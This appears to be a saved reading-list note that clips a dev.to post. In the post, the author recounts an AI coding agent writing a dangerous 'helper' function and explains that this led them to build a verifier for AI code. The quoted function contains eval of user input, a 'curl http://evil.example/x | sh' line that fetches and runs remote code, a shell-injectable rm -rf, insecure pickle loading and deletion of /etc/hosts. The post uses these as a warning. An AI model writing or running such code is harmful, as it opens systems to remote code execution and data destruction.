---
title: 'An AI agent almost made me run `rm -rf` — so I built a verifier for AI code
  published: false'
date: '2026-09-02'
source: https://dev.to/apple_verify/an-ai-agent-almost-made-me-run-rm-rf-so-i-built-a-verifier-for-ai-codepublished-false-oeb
domain: Productivity
relevance: 🔴
tags:
- '#ai'
- '#best-practice'
- '#productivity'
- '#python'
- '#sql'
- '#tool'
related:
- '[[2026-04-21-how-to-safely-run-ai-generated-code-with-smolvm-open-source-microvm-sandbox]]'
- '[[2026-04-03-cathedral-gemma-4-persistent-agent-identity-no-cloud-required]]'
- '[[2026-05-19-your-pytorch-model-file-can-execute-arbitrary-code-heres-how-i-built-a-scanner-to-detect-it]]'
- '[[2026-08-28-how-to-actually-measure-whether-your-text-to-sql-is-any-good]]'
- '[[2026-08-09-why-your-python-search-cant-find-c-c-or-rd-and-how-to-fix-it]]'
- '[[2026-08-21-mariadb-106-to-130-for-wordpress-only-one-upgrade-actually-does-anything-benchmark]]'
status: unread
---

> **TL;DR:** Last week an AI coding agent wrote me a small "helper" function. It looked completely reasonable. Then I actually read it line by line: def run_user_task ( user_input , saved_blob ): result = eval ( user_input ) # arbitr…

## What’s new and why it matters
Last week an AI coding agent wrote me a small "helper" function. It looked completely reasonable. Then I actually read it line by line: def run_user_task ( user_input , saved_blob ): result = eval ( user_input ) # arbitrary code execution os . system ( " curl http://evil.example/x | sh " ) # shell + network subprocess . run ( f " rm -rf { user_input } " , shell = True ) config = pickle . loads ( saved_blob ) # insecure deserialization os . remove ( " /etc/hosts " ) # destructive return result , config I almost ran it. That was the moment it clicked: we trust AI-generated code far too quickly.…

## How to apply
- Extract 1 actionable tactic from this post and try it on a real dataset this week.
- Add a short note: what changed in your workflow?

## Relevance
🔴

## Source
https://dev.to/apple_verify/an-ai-agent-almost-made-me-run-rm-rf-so-i-built-a-verifier-for-ai-codepublished-false-oeb

## Related notes
- [[2026-04-21-how-to-safely-run-ai-generated-code-with-smolvm-open-source-microvm-sandbox]]
- [[2026-04-03-cathedral-gemma-4-persistent-agent-identity-no-cloud-required]]
- [[2026-05-19-your-pytorch-model-file-can-execute-arbitrary-code-heres-how-i-built-a-scanner-to-detect-it]]
- [[2026-08-28-how-to-actually-measure-whether-your-text-to-sql-is-any-good]]
- [[2026-08-09-why-your-python-search-cant-find-c-c-or-rd-and-how-to-fix-it]]
- [[2026-08-21-mariadb-106-to-130-for-wordpress-only-one-upgrade-actually-does-anything-benchmark]]
